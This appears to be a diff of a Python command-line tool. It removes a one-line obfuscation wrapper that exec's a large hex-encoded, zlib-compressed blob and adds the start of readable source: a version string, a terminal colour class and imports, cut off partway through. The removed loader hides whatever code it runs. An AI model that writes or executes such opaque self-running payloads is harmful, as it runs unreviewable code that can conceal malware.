@@ -1,3 +1,2372 @@
-pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec
+#!/usr/bin/python3
 
-__import__("sys").setrecursionlimit(100000000);lllllllllIIllIIlI(llllllllllllllI(lllllllllllllll(lllllllllllllIl.fromhex('7a6c6962').decode()), lllllllllllllIl.fromhex('6465636f6d7072657373').decode())(lllllllllllllIl.fromhex('789ced5dd18e1b4792fc957d1cca3a42cf32e617ee078441436bcb3e03b2b59075b83b1ceedf6f383324bbab222223abab9be44c0f7621b2ab2a333233322babd9a48761b8fffaf9cf7ffefaf91fc3c71ffff3af2f77ef86ddcfc387e1feef1fdf7f1e0e7ff7bffef1cb8fc74ba7791f3e0e1ff6c3f0cbb75fbf0cc3fe976fc3e7efbffff2ed3ffffaf134fffedfbffdf5e5f1d587fbe1c3b380c76b8fffbffbf428f56ef7fef17f4fd7ee1eaf7eb87b96f9f171fad3e5f3a56735878b936b8fef9faeef1e1e51de7f7af8994a9ffcdd17021e710fe8ef8e8d9403d3f777bbddeed3cbebc7ab0f3fb962ceeb3f1d113f0ebf7b777efdd3f9e5b04b0b7e923c92100a289030288f486c57312823c9bb9c5da5a4dddd735c5f62ff12ec8fbf7ffdf6cfcf5fff7e5f4b3dcef8e5db9ffffafae5bfc18cd3943f7e7cf98ec64773fed18551c8362fde0d4b4a8d56c80f6ede4d7d717fcadfdffef8fa580da0a7ce05e620e7afcf7f3e4f3caefdedebb7cf3fde63a99d9c3a1e3ae4ea8e45b4ae141fee1fcbcb87f75360fffaf65fa58425b8f034f45494a7e34f26ec1e2b75190e00e6f72f3f3efff8f1fd2ce16e77f7449718c85d51d65c6eb5ae234353696db20e63efbba282832b6b5848be57ff67ab3e10f151dbc7b3d4c523b23081eb750fef8f8dcd4be5f8dfff1b67ecb432fe3e29a061111cce713a9781a9c45ffff84e6af258c3a74794fd4baedf49b4483e0be0eb87b18b867777acc37250eea62b9c25b48bdb25db9d84c9eb07430fcd6f8d679b3e1a2aaae778f35cb4e5c08353c78ccae028368b767327fb8fc6ff076e8587b2acfcf2f5f3df7fa3c27214f478767c3f7ecf8c385972985df732c7e5dfbefffa74deebd963f73b6ecd24e86267bfe9b160d744e04f0fee4678987d37af2ea68bf2f8ba5754e71c95266b67772d4f9e9d579287e9fe9678b9b8af662f37570fcbb12edf2234eceb439563cbd58fddcbddb87b20e7ae38119eeea44d261e3af6939899829e04f4be2b7712ff26eb3bba1b60ecc077176d8c3b66d656b0e0f59b2d58f6c10e0b7b0d7e1aa1eb78eb3e05245ffe0e2bfe6d8c9c35f6f866e9f3cdfc8bd6d8aceb119ed3fa39fe5e3c56d572af9550275bbe9fe0cb8bf5fd25164b1e2d02b69abcc97336cda0689de44ee012631edb320b4ad78e213445f5188df7de4eefa7d653af4c24bc575d154e8cbb1d68828b55478b3afa160b6a68a666dfb79bbb974f1ba039fdd3f8c3bfd1367494780279b71347e7e39b51c24cad935cfa0039f8e8af3f7e93770ca1ab0f07ae0f0f05bb0ef716bf7cfdfb4b89ee09d6877e7a2a7d64f430fedbb7ef4fb6fff1d7e1a432f950848199b6141f273dc55277454e1a9ed5bec3b2aaa9773bf0b9cec74fc5ace1d4dd1457cfc03fbc78eaf9818683b30ef30ebcd9ed1eaa4f874647e7b3c449d0ef00d9ee08054f56b3c1c7119d28460965c29f3c783ac25efdb975347f54522cd804f55862f64c23da00e3b3bdfc716a627dd1de27d5e197565bc09e4569a0ccf965437b32053287031e73e7b075da09643e019bc256dd21316eb4b8a19d9d3edba5508ea4ad706b803c08d4c18fc949829f4f376d67dfaeed70c377360428e234e9e55fbec3bf9fb73e2e569c29ef67a34f332200a3d1cc2c5178b5ace50dce99b397dafb671bb265aae0ee01dde407f0964fab79e7f0d0ad2bdf450a2ac3124d5be36ee3e29cb769243ab0ae807ad5acb9fbeaac5b0ca7e380027b5e605434b9b9a327dc81e69e25a15f7362847524e6728d732af7669fd986f598de6b526aa75cbcba87157d0c26c432bb8b1867e9ccdcbc70fdefc6e05e47717be79c578d574c8e250064f6d8ce811b29ce96fbf0653fd38b7d745e92ceac3c6b768c23e96d2f2fb55bb556a5f99bf8485772d73384672ce9b9ddf6bb217edaee56caa145ef37ba2046cab2e46dbf29b2d65166319a95d6ae7e0fa802106158e4b658431339fa9b7bd6bbec6d985e14f30230afc6a53e1258a2c751dc5d7697af36fc56deac11a7d1fc1e1dd0cccdf04139ec22fb61e78355488559015ce02cb16e1f368b3ebd3fec5dbda159ebf872ccb3c5ef7cf68d47f7d469a8af18606ab7ebdba6ce2a5b2365b90f4c2e7143791dc7d9845ca5156c21d953722fb87f7a87880e1f0a2dde15fafbd6f20f232cb1e5742ebfeb7cb62f302cb5212f750f6d7208bdb68f19fbde7b89f18d045df2c6408fd2d2e394d9f956cc72a70ab14fcd3f6cae771aea570c1b2bd1cc284f6f68adf718d3d0dc163a36ae99c0b30afed898053ec5e9e093be27b1e4f1a1ca905ebddb99f78b3c517b9a62c77db9470a56dafd96d9fa5cf5d7d3c28dd6baf7a62e7883618276a1db21631d69338a0a803f7e59f3f1dbc5dbc45bf978e5061e035df1e6ab3a80af156e61f8da7d4dc341f6e56fa547f396b9c594ba99375ab6c8b614dc135aabd51cc9b9c8b367b9b63a7f9cea7fb76fddcc5be64b69bded5ab629ed52c83d194f7f177e546fb476f1431ebe9cdd99afe807bbaa4d6bbd041a0169dcd3afe1d6bd0161a50f47fadc718d85349fc56ee291ac296ed0d32ddad2256f22f53b1fc9e3d1d57ce076c1e2baf0cdd6193b5a52609faf22f64404b26cb5fb98dd5ab7b61b0f97785ac3cafa4cbbb9ca99fff0b74a63b7440fd9bb005ee2f1a891d03a632fd1355eae155cc6c1b37f856e9d0f20c70b329bd3c2dffcb0fbd0751e38b037be1edf6c3afdcd12d3e379d7635d98f964ddf4e7eede3f4fd9bf2c3abcda1fff6321a3b1d34fe69daf9d663f74bb45d41f5b3902e6826beeac87ee4798353cf0d0effbedd71230dbdcd1dfebb01ccf6236f729405d845dcc83b56f3ad9f1d0f169cb5ece399adb21ee97310833b9278dfbc8ba8e70f7aba323bfbf0ed36851ec5a121710b8bcfb1f4eadf2fcaf279f7e50f379702aebe9dd4fe5d81e5d24574b69e58cfd30f9cf155baa9effa5ba30e8f1f853c0b8e5c7574c46ad5fd9fe6c21d0169871ba280d95761efefa1c424e7f7dc8ad6cde339ba0bf5ea6483700ce5dfa1298830c0f233c1a743c01662024e3e9929f343dddf2605118c53cbde83c8a07e2aa21a47227eaa5c8c59980ac534252a6013fa629466935abea3753a6612d4a78a801c25651a9c7b463848bfd3d6cb8b8ffc835825ae5235ad19c230d090266a051db2d294d0da630f305164cae64e982fb76870daf9c811a8ad95e4f112ae5e18df08ebae5fc5f687ee3d98461c7b2bcc072d178f17ee87ff369ad330b8e2070d3da9750a4aefea8b287f20146eaf6ed58623a1f9b5d4c6ff14d22dc02081db220f5e95b336a229acc620318b3f23d10204091d1d28e2de1c01026d3d6136e8720b75c8caee49c9fa80a54438a4f29076f7c77d42de7ff42f3964cd319a9edb3966fef0fa7c1453e20ef2570e50f7d78325cfa1262c6d51fa4ea51af3325828c1c4533429f28b157d8e945e1881cedb226f01b9991f6368084c9beede55bef5ad688ad773520be46be2b75cbf9bfd0fcc69329884f08cb0bf0ec8ef6f0774b4d2811079cb5f62514afeb6942cb6be9ac6ae122ba1ada8f4c6e5a741ebdb92e55cd9ebcea13c359eee5c98dd762b7d71022af2412658f66bbc4843854f835afa23810df3424d26a11057f049ca4ed786fba912d09861a7063ed4b889ed7b317154bd43eaf11304c248f081849cac9ac5875e851b4aa69d179f4e67637050d8f610f057e2333d2de0690b87f08f542f664a92cf0127cc5b566d7cc6b395ab88eadc9008d526856a6602be71126eb6a6847935d739c41a3a2323e94ca7da7971e5fa553e3bc3cdff8a5f8ae06db12bf9c411ada7a61649783256b0a335f60a94539572ab441945c8373ce0749d0e0f514a1521ede08efa85bceff85e6379e4d25ec108717d16cff4f1e7c1e7a3e0bd0fda982b93257bda7bb47d7412cd7be84e8746d67e83829303e0c3a7355236e5b741ebdba2eb23d204688b4b72c57a64c037e4c538cd22aea68523b8934a3d35a0c3a2e077132ebd819ce9a5b5732bc6aac4d6f2ed315343c863d14f88dcc68f136f207f6d1f1d5ac4dce58a05a87c537471240a5bab4261d05a0d38e0aa5cf9b3b96599a1a4c61e60b2cb528e74a85769193533503db36dbef294aa57cbc51de51b79cff0bcd5b3e4d6714129b7afbe32b63abaddcc640eed1d588e8487432e0385437d2e827540fb9bc8ef546b6f8ada7b0cd489b9e361573d27aa54f867c3e3dbfeef9bb9d0a5e9f9f2b00397ce94b2858d77637ec74459d3c34028689f19d7138346da87c4554871e45ab9a169d4745cecf28be4d4b91e36b590a1a1ec31e0afc4666a4bd0d2071ff10ea85ecc95259e095f84e57fc44d0c2869282cd3ecf759b3d320f59b63daa12a75f935d739c41a3a24a4928d5c892449e6032d9654b8149f35d0db655947286dd8346763958b2a630f305965a9473a5421b44c93578f649a3c1eb2942a53cbc11de51b79cff0bcd5b364d67c8f3474b87397a051783a7546ee2ac5b8b341a94f52fa1905edbe137243fc1874167ae6ac46d8bcea357d7a5b507c40891f696e5ca9469c08f698a515a451d43aa524b33e6acc5506aa35055a04b537b31d415ccb75c1ef26535270f9857906bb4f6bcb9e6ced2d4600a335f60c1e4ba8dfe0b246483d753844a797823bca36e39ff179adf7836518aeab85961ed70ae79fabbbdc3cdf69325e7e96006674fcc3c8c0f83ce5cd588db169d47b7738d3968c8af4d037e4c538cd2ea36ce35034e78a801c25651a9c7b463848bb7238be3f0301a57d2c1599a1a4c61e60b2c985cd7d164553390c5db91e50608afd42de7ff42f31bcf26003b16e445b5c789a5d7f77b7bc8b9a6ffc4b772feecf357548bb6d39746522ce1e3fb20811926519bb249379915ab0e3d8a56352d3a8fd213dbb51ef714343c863d14f88dcc98e36d33bbd10561738c8b11da583a98792c6578e4af00bf2da2cbb10825244db2c5f02e2929ce3996246203b9291d344f9836842f5b4e0c3b58d0eb6eb59bc5c10c15b5d028c76a623627044085221101af4a4e264120e8e6c8e3e345ea186858046157987952d72ab3a809cdc832495bb0eda4b9efd0d743a50d477a82f899d8a73e105d8f9d1b2893f00286b8299b85a5d8d86076686f3d49a44c367b49e49a2a81362d1dc8a1a41e36bbbeda185a018533f634a15b652ad0e00436ae8200c80858bb97cf2066303781ea14b266ee9c74b263c18ded9f06432656f4cf126569e4052b08880d282604a8263291351dcc77ebc1c2406a69b3432630a1729c4841e6b95489d454610c046a98207cdda27626bcd4f0ae5c2f896945d9abe735ae5ca754c26ae8b39d9a1426a7d18d9402a4aa7accd1e09d01ea95663532d26c5f8544a48bc0ec8302938b59316c0aa45a0a1da9d25ac7e5e562b24389655661c81529d0eefb660bae257f0da5b219e34888a8096dbb1eadce8301ce6dab2a407a9d1ce97bb570c096029e67207a26325c7d63b5ce7e50acc86e58e17d5fbb9b075524d2067c3ba3bb1d5d98913f4809778394150d22a976dc7130295008a88e60ae2b10552446d2b0c7bdfcb3ec2e5f4dc6429b6d342744ab2dfd7e77e18d0ab191048517b93cc7b8a992195d436d1d618a7054cde23271f5052246ea98ba00eff73c2c42543f0ce3f16ce53a5e9cdd97260ec835d0020103cdc4d6ec0c4b84a059cdb2d6ad888d62ddac91ef5b6de678e67c21ef90402f2a0f619176499b3976ad7cfe605460f6093061aa0362b7649d8ea4e38764cb8e6522f4b75cc55006b80645486b3e1170c8234ed38c3536954d804c6a0b3449b4719e199e0d9db8af8235b301adf58a0a97dc54d23d20a379e5751405ba3802849d28b174efc6c8849854eda4c54c561a75b4655ecd26a0a81ed3ab5d3e97b50707299ae55f26c5625269ff86abe31a11b3baada2ea6c60b82a34918e660478bc561766209be044564fc83963887261e54cc558324963a06e63d95634b2bd35655e9064e85e7d683a898eb21ae3d3e128a16f7789aa85d936ec78b1433f423150ecc89cc49353b6ea7850c9d6df47cb3583a1ff40bca4d579461c5fe66b74e47e6d1d415a9ccb5f7b0712c70b1ba950b47d2ba48866d3030c9aa79e635a3e2d17430d35422c09c28556c600ca09cd09cec66ac730de96b529ef4f96f434cf34c3bdfc00db48721fc9d7b7d0118aaa49da49f8027d728bcbd297c694a022d4084d61c6049c5aa5d96ac2309e9341c28a722e402df951eda75152da2dbb259a733c6a9d923b676458dcb0468cf0b3155b47a5c4e0331b87d528d6eb24a32384783da16ba280ea3493195f0737d3aea8882b6471ed40273b635baee99bdb210ac35a3b350a691e7d1abf60daa9596ffb8cd0905e2dbd8a878b213226ca31338d0491b02250f075be6c2f5b7368a11b14b9af21b68310a3a522bf6785aed5f5408c5a710e0c55c1a675e1f26da2f45935e83a2562c49536e8c75741cb67778fc12a31c091d6ae9542aa4131bbf1be639876d2463eae4974bed6b2958ae17861d27b96d8c89c3006b48c02b1c0b3f930b015b1a122b258e8b57fef83470e26308fb0986827b24c47c15e2cad98924ca88c73bd04d13426108faf123d4de1a988488d5bda421543571288aacb2dfdd13f57170582166811326b002a48379bd071a25572ec336e200b79edd25d724cbb8b61c0ce31f2ffd57d68fe72e122bd1902565c88382440544bbbdc9d01be22cecd66acf266e8e98647b994e5522ba54b80353202c4baf6a114520d8ad9dba92d5c98645d98ab78c295fc768c990e26bf14285842741b60b223851dc9881b9fba3aa79b25036b3e43420f59999bd11c87115e3175321d8b7e27ef15d1d0f91a99690e8cbd5f331b3fff4bf5a7c26781910633a08420d2577bafba3386e7776147585c60e2202a42063ed8fabd1208213285181c014148e298c540c6e21bab8cc8a54ed6330d6174fcfd4588027766f28787a926668d571eeab8078e784d05a409c3f115ed3c79358fc2196419832429ad37eb88f5fcdb52ceee6d262b74696d54581b68e8af954a97c5e0b00bc53f0cbefd4844be4a0bed7809c956e572caf839b95b99077cdfd6d159e850708927391691800240b9ea163e51d09914f501ad4fdc85e52de9016099fd416e2c1de79692d37a133da5bdbc34fab7ddbd9046d710f65aaedda6d636250ed6f2909a4be14bb16846cd9061d1cb51b5c117c355e7414da0a8baf6fb6e99821978b5d6d2fe03117c543b9a84958a43cecdec242f17aeb2ffc49eaa6656a221ec7995521503283eb22d5c74bcd65e042673cc821c6b3602598e2b3beaf4bd7867b61abf0586726d36a7fd7452034816310499b17d03e7e57d1463de1df9bbaa315a5f8c9d1928c209da96ecae09ee55aa96a31ffddb27ffb1f300456acc36e46cea45d4de7e9c2354d0782fe4f82a59272b60caf074ef5b2a985b5414054a0cd51598aa347f23f2c475a1a123f57b298fd9ba7bbf3e26957eb9828ead5c2be992ea99a8a7992c93356dd433d4a18cbaa2c35018bfc467d7f4714ed69f928dd86f00443676c9d1f87683a9fddabff8a36405d6caa522ca5bbb452d0242176cb704c52a26175278ba52125581022270fa8edf267d4cf53bb9e33ea51e6b4fef828a1ba593963bbb558b83f878c1f19f321e5f993705dbd2505f8fafb3700497d23b0d5d5602c6240f75c6794d1f046828b0b984ca93348a73cb2d1fc9599e099668160043ea002c771ba2e84153c72aa80d2f342d12d52653f414f8ca6ffbf21d5e8c07fa9d40276aec661707aee5a41605bc4f325be5c933d4b04983270b51e8e2879a80219c1b8aacc4234894f6c9dc042539c782535b1f379054a08299765eed15a6cf3be54a09319503265313886aeb0498dd4a3c0908d1be7c2bc59add4a6b6ed7de2764130669c4e5361a33b6d638b339435a6ba801eb40e0ac96131a34d4a26c384e8012b8827aa185efcb77c8b0e44e25ed8b0689f1c50cab42484fb6f5c2023df614bb2cd6290f858e47da6c4621e991af6ab4996f8b87a990dc9f4633d4ce2c327f76adbaea832444ccb4179275a412950e00889e18b2b73f9a6e79ab75e6aa74f77ba7d8400a7e321a35602dcd35b32604934fe9a93e32a171295b6625b3b20a6ad4208d0985269bdf9aae9c96a0c4608c1ea5981d0e3172f188bb94847151b6c3605b4bb6ddb87413705b4c16744136ae167093703c7b2225d190656a3139d5bf174b1bfaf26a802bd13ec876cee30946f386a61af2213b75a18366ca20fbce557099e34b2129024d875aa8138d26f664268fabd0b965e45eaa1155ae55310ed4c83becdd4af2a277d1906368d31917ffd620a8d52115527d2ef3b28984e53d8f672345200cb98ac0ce66525bb28ced9215c7df2ff20483cc55f91101326310113b093a75ab20522f7ca687327b51eaa93b4f493a0d6b84f91d46ac83d6c0f92849cbd5334cdffa8efa2f8ab7f16327c7576d9483452151ea46621c92c5f40987335d4694c9f9e70aad141615663aeaa47b100f8b622d3d164f20e99c8b969a4204e7aabb3f230cd7f0f12436a345ccf915735c5c42aaa29cdd9ec3acaa262817870e46daa83b112d53eded604663fb1c67b2ce6cccfa7e5d49aee9fcd0ad48c75c93118a14de6861b392771aeed0064eb5a9a35d43bd315a1e68c53eae06ca01932b193ac182d17c7caaf7de5c8f18aa02d8ecefe039862017b27885fb7561abef6432acd2d0e9706ce382c476984ac14129c8805cc70e24da2670a9c8183d454f089d15cc301f5305422daed28cd187a160ef8c29a33235fb431534bad21637b5aaf555bc9d4f593ca2193b9a30d6cf60ea1434f942df85e4e97c7c95a23459b4cc270bf103e9a588e6f2a112a91a8ca4190ff304257cf6de6ef3aba52f0ae024c65bd2504a468803f625524686be66890c2bb32fc5c4a9117336484d5acab0ac93ac19e5a8348e0f46dc8cf2344a0fc9abfa8e4ddde2abd509f74ce1384daa5410462fa1bf5c36d489e64fd703f6bd456d4cf4be5add1040a4174df06a7af3fd76a6c1eb7d22d1d6de236a29aae1b31bbf3d921aa6b8aa454204f459aec88a034713dbcb951290cd0fad364333b6487e68c3441225c757719d3492b85b6794794a330062255f982a4612e309800dfb3a6552651347b29c5ccc8a938102a99676f99ae444731bddf2ddbaf1e464e0a82692dbd4f0f49095d7f7c5f44841641119c0c999d85b06ecac3d35d7b3a00e480c340425c7aff091a6a8d0846c6c7f6222997fd58ce61e34913c3262cac729b357bb2f16c26e0db55a5b194c38d7c096f262b86174c9400c145dadef9b2639c3d3d3a05187677d124d34f2c88cba02485e475b569036b6be5c69461e7935984072bda4b580904c63265feecfd4f35c39455d2ec1fe39be62f18e6b8381311a444273f7cbdb26a44b659edb2a97cc702887673b8e74bbdadc85408d6d391e45652e139004f4c95cc55023eb80c90a70e5b228c6cca324af5f59dfd51259b9302068bbc2d3b8d509c9a1e2b286041d78a3e77fbe9ee461c349a6402b7b9d4465630e1310b85d7e0d8fe868e4b66f251f748201910431385ef40a47d49f45604e4397a46010d1d674d71c8a9a0a3f6e8850d9a0d780da1e8c347ca58447194fb2a7652fa3aaaa35606694b381ebf4369deca1c394a078b015416c85a84bec5f31867c21893895aa9d11a5f9268648a7fb2034216f3e310469eb57230c4b0240d52afb21d25b7880c87277cb9e2dd6726bf402422e4988fe1bd818cce58a5c6d0b29efa996a4d205e73b9cd14457308074ce6d4c09cf617cbdb4a61ed502f804e15cd41704653b2a002063d194b6ee6380fc93d7b1d0a69b1e4858f40b12b169c592c8bf51725d6b25795318e22420610ee81f93434b104e092967cc607eed5f95b010613bb7a0d6a95c089ed7cd6d74e912ced33d9f02c9b257aa0e68e0e9634ce103142477cd108245f60563c9d45a778fc9701f791aacef71cf9e322074160d0e30674ecd3c5ec9d91a8f4b728eae9139653caefd94d7f40404f1bdf315bf9384b077d281d079e3ef187efac4cead7d5b2af42d489d68021ce77f6c27cfcb82c055817926e14c57e8129268abe28213549b82f3e9e0c398c45ed8d794ef52355d8ae1bcb017432b4a300b9f0b0486ca16b7772206dd40e2213ccc14870e16f4978bf6565dc332eb453587c2cd576fb90c6b3ffeeb908ad99c6a10e388477ecf55dcdce74e06c133ed17d4cfd4136ec44d4ffb53a67048e25b6ce3c88d82098a35e520498450b9d401161a5f3c1bbd5178528d6168c7f1ad5d918dbc184ad3d58a20c5f1da9052dabffe26fefc6ecd422a96c7d645cb83e051d118a675a79d842a0cbbbf001d060d333d15adf5214b34a567c3e08c59478fe32bb27915656b61be81ab222d4a3cd77ebfa71a9ed5ab585f4c06f0dd7bacd69159b236edd56a1192525c93d163ba00ec7d29b552ad494d2220e0f11566842ea0bf4d9e0a105a957fcc970d1e5f597b6790d2d603a0484af84d33dd0be67a4b29b404cdf22bebe85a0e041e96ac0b7d05b9764b6d4c8e2dca89fd37e642af8eb0ceefc830a5bc32ce115b498bd40b0471b658bb8e3006c7955f6d487c997fdcf761e42d522bd06dde0df89227a8ca8b18c9c29db7c4ae1efc4d78bde913925ac98c3cb3738698a6bc0461cd53574ab7c4ebe05fce46064d968d089031da25a3903585b045762fcb397c4a146f203ef1793cd57fa35f30c4b699a5b2f66e6a796c5db41c5bef886e0950b728283d1b8675313cbf5be268e0141a0bc4eb72b8d6a34bc1f1ca56798772766a796c5db49c5b0fc1c65d4019d3fa82db73fb5fd98b5048fce06ac25b6a6a03486c739b2c6c0b771f3125c83992cc1a0496011aee2409eb740ae8a2800161c1408891675b4badc9e46e14469d97717d2af4f88701c4cfec49a297bf959e3c86edabfdc33361ec6a535d9375234f4c02b665591901e127aa27fa3e4032f1d9280db0c47c9d39f5663050e6e368fabf80c5b8737c1554f62e5da1048c84b63dd57e9e90daf6b0eb6916056385fa68aaaa105500442caf8ed01b86f918cab53eaf7d9e3bea956a4df0974b51c34710575a522d1750257d18cb2b4056d1cede8f00f8bc42449c1599a78365904094c3dc16230cc0c558472d027e6b89bf6178ad18444e00fd652b91ea7b8a6ac073ab4fe3892515204223600cdcdf5631225f4e68ad1d81c9a97d048e7bed65e55f4b0121e1ecddb4e5f31838d291c9321a68b0f91c8e20409f25ea42e22014933fe305b134e37e484fc2593140ecf58a68ec4562904615f91ba9cdfe7205d71ec23bbd4e543b864f54132f35314600b0945d3bb05ad1f0847fe5e26443ec309d9bdcd2a153b245ec8d7caccca4b65233dae2ac24a231ec0c3b8ad9ae81a06bc8656d69eca60c8c28d5995b79dbd1b07f4c17917902a9ca406f07caff2c9f725ca920dc58cce6300816f5bd9096ddb2a22cd8306c1862be6bdce1943abfb4bc6a05cf392d86bb7420561353b89cd896a13ceebb3bbed79f1b589417c0781b1d608c841631b27d5eb261d83084952d68ff1345690a38284289a294ccc8451fb56133a7a36659dbbb2aa9ada909d076745111a754b155d90dc386e12a31946b756dc854d10a4aa79fc2c0206b794e4f0baeb6ed0c1485f408b02d55644328a1334f2ff21babc69606a61586cc842275b83090083a1c45a20c2e4878c2f510a80457a442531b25523630443883a0b69c4388d28c23c9b01aba14520d8ad994841a6644186d231f0fb22fc8e9c0b57c188e1895c0809aa040c3a343981976e5a0829b6a936346ebaf331e2f64da8024ee129cd50d48c5d5124550281f2b9549804c996a316ac9f5c5bfb150c119a1ff40eae6c23fbfb7f3b44719a175d1aff4f9a6c7195bf5e2614e44fa125b61ec6c90e76bb6e5e77f531968ee9d8d9fb892fca0c6979a51000dcf65b04a2c6fe854bd61581f03a2f769a8bd7b651384ba309303b8e71975baf2ed5694cb0a0ec347c32b072f1ffb0dc386e15630946b537df976c7158d675abbcc77a873dfe68a2ec37002f8d545e983521961d4f1558ea974551016bb152e9769b13e151d5a63ed69dfe170a71f0f0c884c39451126bfc41ce1089ca06d6822a590a8bda17124ab4d0d5d0aa906c5eced2e2f1d09b098501314d8eef206b28394335819eda5a278a9e54471b5441114cac74a65122053a65a8c5a727df1dfeef2a6da3c4bd77697f7f9d2058f02e77f531968ee9ddb5dde5a540a037bb052f3b5fbce11d1ca48c32b74eedbc48026d4d19311af06e37cce37db7a548895128c2786a058c3e420cda6a3fbf25d646d98f4a6532a0f5438b30cedda1fe695f1f9e3e10657c542637aa13599f614298142447b5a4a64a9e8b66932313be434b4b8d7f9a01ae4dcb083cb8912d87bbc92e8b41286a7c9067d414d80da72358c2b68ae2b41521b3e211348ace41d46b51ba4aa55b6ac7047c594b35869378dc18ee8b4e9c45bc2898c0328f91bbd54adf4b9ed2085cb81cb003194ce3081281eeca9205b6eb7497e4d189edfe529d13309ea7932c76b5b02476676397b653dceea45284e17021203c92ae94eb538c27a830c7f7d18926d052244d2662022ee39327d4acac8d8670c8234f2fc2a51d49438138b21a1f03f2809db5ebf61b8050ccfef72b44c9ee70333d37978f33f7b06c17283738fd03943caebfa472d0c01e72b693b649b695b4d75e148357cf5d70e39a613591c597683d565c3f05a3134f4bc5afb8aed5f0551cc67d8f24a4cec78081592c9eca21d4d9734869a28167898f66a49c7b0439dca6712a9c086fc97160380259ebec5011455227510c192045725fa54dd287155bc56931d0b926589d9a67101fda65d6859afe085c9329591e992026e944b85f74c0e130f68b38e577af7a4d1d989b4f86484a9a5171d065b9e494f00fb8413255fef7ccb901284b351459daf2d216d28b6d7d80f6e1856c440730be78cffd9760d9ba932322f9b0de7377d6b9fdf49335dfdefc08c0d988fa69ec42407b5059adaecfcfce6dad48e87ad557d3548c45775e48c42ce4cce6ef0819ec4372c11b522d3213c2044332e4c8f72095b4079449329de2c32bac2ec6cff6a551867a859665cd437d2c567196fb515d8309818ccc4f3b2ce7b4e97e1a12e3acfcfef0de1d26a2dfd8cc42ed4d99832e9d821c7577e33d6f0510ed67ef31f31726be55211e536da018220ce6cdf202dc715322aac62722185a72b255115282002a7eff86dd2c754bf933be2a3dfb8fc59e874d6356d8d3942e119e98e0d3825d20c4d00da2b17d1ca62ef74c846bc5ed9057c11ba174e68ad2cc2e4a9cc3ad514d052ecf67b6a1b862bc350ae55a99fdef0a39cd71bd434ed32fd2596bde760a415c7375bc734e845809a0d8c2a9678405f554e6e18360c0b61a0377ce3967ef46a46db8bb47185a195a70b56f90b2b85da731a7f898507dbb14d4d2182b591dc8ed0947294063ab2f80de7df8661c370751864c520e582263fc19c3e1fc44aa44d028aa7fb34cb747de544a638675e96176c1d89b10cbdc4c8d5d732cbb951cc72d2c1d2d6edf8f9622a4967dd26ac8254cc749e2a1120b4ad2966c91fd69cae2419932d7d304191f959a5cc855448a6cd4ad822b9f3663e3593c60800925361d6b90a03e63e5fcc04dcdf31b5226d43e1e16823205c5678e1b8f175f46cfb11a298593c2a882c5b6e2ec8cec66e17b0818daf1ff2d889bca404a2e3a5391e623313749ef3e365d59ff8ddbaa66d88d982c957a19b1b4781a09491f70a171b09249527ecc583946dfa0d1e8c956a5210a28ab261d8302c81e1f95daea5948ba07ec31a39ae1556dd6e6aabd699ff3658b061d830bc020c7b056cbbd1eab9be7222539c332fcb8b10b9acfa3e44ae5db209406b0d324100c481991c64c2b06a2aa23dba12c5a0e1fb9014369c1efb7cef58e67b70bb4f6b49c9d82269b2dda70d00484e69c2b151a03060eef3c54cc0fd0d572bd236141e2e0b41b8f58da445d174ca02431668b750cc2c1e1544962d3717646747b60bd8c0c6b7fbb4422c363341e7ed3e6d3427e26ba865bb4f6be9f1cc4e7710724ea9b3e108ca60a355818965d4d07b032f9475beecd71081161222fdc8bef2acae3572d460523acc8edc263b63d125dcedbb58f59f664bcdccec37ecbd96a9de915aabadb2382e0b85247f7362f32522b228b00218124751d92972c4136213cd6de18939a41a78f73fa46dd806e9d59a4cac59a176475e9361f3f717cde5724161579c084065dbc96332e772c905d1c38c0b2b516144d336050463a3ccab4a33d416244503495bbfa1d8f6eb1c28e2a9cc66b3656a783f4f458ca6f062f672cbc087d2b054ccea179c19fb9240a5b35564b2fdb6668d0c612c5b84f52a3fa69f5b978d29247d924b46035e5c6b7323ad30b45c9f2a2e909389c6218913170c04cdd8c7d270b914a9626c4c362ae50cdeb0dbe134353598c2cc17580879cd6df6242488926b70daf9a07bcf7a3d45a8948737c23bea96f37fa1f98d6753101f1986783915707cd561b3932e604e69cb02840f5c6bcecd1018e64db2674e989601aaf9d782895b0d1167d9d394ffa51d4d76cd71068dca5e591349d579cc97e23c9e8ecaa0f4da6784ca4645c9c7962e639ba19786360619d062a04c96b4d80fbb87ddfbc3ab7b20f6eed3f4e2ddeefdddd3ecc9c4bbdddd70fff5f39ffffcf5f3470550dfd84179c9504f5686b568fd4b2854f6af928d8c9bdf9f73d218a903f161d099ab1a71dba2f3e8d515e4f6801821d2deb25c99320df8314d314aabc0925c472ecd98b31643a98d4255812e4df58d505730df7279c897d59c3c605e41aed1da93ca8be6446ac82230c36e4022bb1c2c595398f9020b2657b2be5deaae154addacd3537c4a3978e3bba36e39ff179adf783205f1096179016e3fd71cff669d6fc6c2e60bbaa9a31608cf155c42a4b9fa13d61eca071871d284c6a0554d8bcea3b77a9ac26617d35b7ca3d00bb3c93278b9be889934bbdfef8457db6f66aa401f71741615c158853891e2e2aa5e53d9b1653b18c264da7ae4ed4ce8968bd19594f3411234783d45a8948737c23bea96f37fa179cba6e90c15ad58400dab588b173f1d027b9cb80a793f0ff79fee46fe3dfcfbb4f4859b87778fc226338a29c72bd5b409fc72453d3e5d1fac000a8b15141297acac00abaae9443216ab0d2cd6549305542998af53cb9e563dfc7c7e7bfebbdbfd0c0d781a632364e051c9818c471defde9d5fff3452bd7bf8c9117c90765ee5ad590c4c21f824e061479dd4e4be8f23c4e797698c05c8f4f2c3d0a78759326cff3f7970a8aadd002a602f95af897fbbff079e8564ec'.replace("\n" , ""))).decode())
+VERSION = 'v2.1.0'
+
+class Color:
+    BLUE = '\033[94m'
+    GREEN = '\033[1;92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    RESET = '\033[0m'
+    ORANGE = '\033[38;5;208m'
+    BOLD = '\033[1m'
+    UNBOLD = '\033[22m'
+    ITALIC = '\033[3m'
+    UNITALIC = '\033[23m'
+
+try:
+    import os
+    import sys
+    import requests
+    from git import Repo
+    import yaml
+    import shutil
+    from flask import session
+    from concurrent.futures import Executor
+    import urllib
+    import signal
+    import sys
+    import threading
+    from urllib.parse import urlsplit
+    import subprocess
